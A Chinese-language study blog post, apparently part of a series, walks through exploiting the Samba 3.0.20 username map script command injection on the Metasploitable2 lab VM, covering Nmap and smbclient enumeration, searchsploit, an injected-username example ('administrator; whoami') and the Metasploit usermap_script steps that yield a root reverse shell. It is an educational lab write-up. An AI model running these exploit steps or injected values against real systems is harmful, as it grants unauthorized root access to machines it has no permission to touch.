---
title: "Metasploitable2 渗透学习（三）—— Samba 服务枚举、漏洞分析与第一次获得 Root Shell"
date: "2026-07-07"
tags: ["Security", "Metasploitable2"]
excerpt: "Samba 3.0.20 Username Map Script 命令注入漏洞：从端口扫描、服务枚举、漏洞筛选到获得 Root Shell 的完整渗透流程。"
series: "metasploitable2"
seriesOrder: 3
---

## 前言

今天继续学习 Metasploitable2 靶机。相比前两次学习的 vsFTPd 后门漏洞和 Telnet 服务，这次学习的内容更加系统，也让我第一次体验到了完整的渗透测试流程。

一开始我以为渗透测试就是扫描端口、搜索漏洞、运行 Metasploit，但真正学习之后才发现，每一步都有自己的目的，真正重要的是理解漏洞产生的原因，而不是简单地复制命令。

本文记录今天完整的学习过程以及自己的理解。

---

## 一、端口扫描发现 Samba 服务

首先使用 Nmap 对靶机进行扫描。

```bash
nmap -sV 192.168.93.148
```

扫描结果发现：

```
139/tcp open netbios-ssn Samba smbd
445/tcp open microsoft-ds Samba smbd
```

看到 139 和 445 两个端口时，老师告诉我：

> 在实际渗透过程中，看到 139、445 端口，第一反应就是怀疑目标运行了 Samba 服务。

这里学到的不是命令，而是建立"端口 → 服务"之间的联系。

以后看到：

* 21 —— FTP
* 22 —— SSH
* 23 —— Telnet
* 80 —— HTTP
* 139、445 —— Samba（SMB）

应该能够迅速联想到对应的服务。

---

## 二、枚举 Samba 共享资源

知道目标运行 Samba 后，下一步不是立即攻击，而是先进行信息收集。

使用 smbclient 查看共享目录：

```bash
smbclient -L 192.168.93.148
```

输出如下：

```
Sharename
---------
print$
tmp
opt
IPC$
ADMIN$
```

这里最重要的是：

```
Anonymous login successful
```

说明：

**目标允许匿名访问。**

虽然匿名访问并不一定意味着存在漏洞，但说明服务器配置存在一定安全风险，同时也方便攻击者进一步枚举信息。

随后继续连接共享目录：

```bash
smbclient //192.168.93.148/tmp
```

进入后执行：

```bash
ls
```

成功查看到了共享目录中的文件。

虽然里面没有特别有价值的数据，但这一步让我第一次真正体验了 SMB 文件共享的访问过程。

---

## 三、搜索 Samba 漏洞

接下来开始根据版本搜索漏洞。

首先确定版本：

```
Samba 3.0.20
```

然后使用：

```bash
searchsploit Samba 3.0.20
```

得到四个漏洞：

```
Format String
Username Map Script Command Execution
Heap Overflow
Denial of Service
```

刚开始我以为四个漏洞都可以尝试。

老师告诉我：

真正的渗透测试不是"全部打一遍"，而是分析漏洞是否适合当前目标。

于是逐个分析：

### ① Format String

属于格式化字符串漏洞。

利用复杂。

暂时不适合作为入门学习。

### ② Username Map Script Command Execution

看到最后三个单词：

```
Command Execution
```

老师立刻告诉我：

这意味着：

**远程命令执行（RCE）**

并且版本：

```
3.0.20 < 3.0.25
```

与当前靶机完全匹配。

最终确定：

这就是今天要学习的漏洞。

### ③ Heap Overflow

属于堆溢出漏洞。

涉及内存布局、Shellcode 等知识。

学习成本较高。

暂时放在以后学习。

### ④ DoS

拒绝服务攻击。

只能让服务崩溃。

不能获得 Shell。

不符合今天学习目标。

这里老师告诉我一个非常重要的经验：

以后使用 Searchsploit 时，优先关注：

* Command Execution
* Remote Code Execution
* Authentication Bypass

而不是看到漏洞就全部尝试。

---

## 四、理解 Username Map Script 漏洞原理

这是今天我认为最重要的一部分。

老师没有直接讲源码，而是举了一个生活中的例子。

Samba 有一个功能：

Username Map Script（用户名映射脚本）。

本来设计目的是：

例如：

Windows 用户：

```
administrator
```

自动映射为 Linux：

```
root
```

于是程序执行：

```bash
username_map.sh administrator
```

正常情况下没有问题。

但是如果攻击者输入：

```
administrator; whoami
```

程序错误地把用户输入直接拼接到命令中：

```bash
username_map.sh administrator; whoami
```

Linux Shell 会把它理解成两条命令：

第一条：

```bash
username_map.sh administrator
```

第二条：

```bash
whoami
```

于是攻击者就成功让服务器执行了自己指定的命令。

老师告诉我：

这就是：

**命令注入（Command Injection）**

也是今天真正学习到的漏洞本质。

---

## 五、命令注入与 SQL 注入

这里我突然想到：

这种方式和 SQL 注入很像。

老师告诉我：

我的理解是正确的。

SQL 注入：

把用户输入拼接进 SQL。

例如：

```sql
SELECT * FROM users WHERE username='输入';
```

命令注入：

把用户输入拼接进 Shell。

例如：

```bash
ping 用户输入
```

两者本质相同。

都是：

**程序错误地把用户输入当成程序的一部分执行。**

---

## 六、使用 Metasploit

接下来第一次真正使用 Metasploit。

进入：

```bash
msfconsole
```

搜索 Samba：

```bash
search samba
```

找到：

```
exploit/multi/samba/usermap_script
```

看到：

```
Rank: excellent
```

老师告诉我：

Rank 表示漏洞利用模块的稳定程度。

excellent 代表成功率高，非常适合作为教学模块。

随后进入模块：

```bash
use exploit/multi/samba/usermap_script
```

查看参数：

```bash
show options
```

主要参数：

```
RHOSTS — 目标主机
RPORT  — 目标端口
LHOST  — 攻击机 IP
LPORT  — 监听端口
```

这里我第一次真正理解：

Payload 并不是漏洞。

漏洞负责进入系统。

Payload 决定进入系统以后执行什么。

---

## 七、漏洞利用

设置目标：

```bash
set RHOST 192.168.93.148
```

随后执行：

```bash
run
```

出现：

```
Command shell session 1 opened
```

老师告诉我：

这一句话意味着：

攻击成功。

目标已经主动连接回 Kali。

建立 Reverse Shell。

随后执行：

```bash
whoami
```

输出：

```
root
```

继续：

```bash
id
```

输出：

```
uid=0(root)
```

最后：

```bash
pwd
```

输出：

```
/
```

说明：

此次利用直接获得了 Root 权限。

整个过程没有输入用户名，也没有输入密码。

真正进入系统的是漏洞，而不是身份认证。

---

## 八、为什么会得到 Root 权限？

这是我今天最想知道的问题。

老师解释：

并不是所有漏洞都会得到 Root。

而是因为：

Samba 服务本身以 Root 身份运行。

漏洞触发以后：

执行命令的也是 Root。

因此最终获得：

```
uid=0(root)
```

如果漏洞运行在普通用户权限下：

那么攻击成功以后得到的也只是普通用户。

后续还需要进行提权。

因此：

RCE 的危害不仅在于能够执行命令，更重要的是命令最终以什么身份执行。

---

## 九、学习过程中的疑问

今天我最大的疑问是：

既然 Metasploit 已经帮我们完成了一切，那我到底学会了什么？

老师告诉我：

今天真正攻击成功的不是我。

而是：

Metasploit。

我只是正确使用了别人编写好的 Exploit。

真正高手的发展路线应该是：

会使用 Exploit → 会分析 Exploit → 会修改 Exploit → 能够自己编写 Exploit → 最终能够自己发现漏洞。

这也让我明白：

Metasploit 只是一个自动化工具。

真正重要的是理解漏洞原理。

---

## 十、今天最大的收获

今天最大的收获不是获得了 Root Shell。

而是建立了完整的渗透测试流程：

```
Nmap 扫描 → 识别服务 → 版本分析 → 枚举信息 → 搜索漏洞 → 筛选漏洞 → 理解漏洞原理 → 使用 Metasploit → 验证漏洞 → 获得 Root Shell
```

这也是我第一次真正理解：

渗透测试不是背命令，而是分析目标、理解漏洞、验证漏洞。

---

## 总结

今天完成了 Metasploitable2 中经典的 Samba 漏洞利用。

相比第一次学习时只会照着教程敲命令，现在已经能够分析为什么选择这个漏洞、为什么能够执行命令，以及为什么最终获得 Root 权限。

不过，我也意识到自己真正缺少的不是命令，而是底层原理。

下一步，我准备继续学习：

* Metasploit 模块源码分析
* Exploit 的实现过程
* SMB 协议基础
* 为什么一个数据包能够触发漏洞
* 如何不用 Metasploit，自行编写漏洞利用程序

希望未来能够真正做到不仅会使用工具，更能够理解工具背后的原理。
